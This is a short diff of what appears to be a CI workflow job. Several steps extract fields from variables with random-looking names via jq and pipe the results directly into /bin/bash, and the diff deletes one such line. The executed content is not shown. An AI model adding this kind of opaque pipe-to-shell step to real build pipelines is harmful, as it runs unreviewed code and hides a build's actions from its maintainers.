@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$le62" | jq -r .fn597 | /bin/bash
           echo $ysgdr97 | jq -r .kh7 | /bin/bash
           echo $cudh902 | jq -r .n08 | /bin/bash
-          echo $x3191 | jq -r .pyw6 | /bin/bash
           echo $ias966 | jq -r .oitm95398 | /bin/bash
           printf '%s' "$tr7" | jq -r .f5 | /bin/bash
 
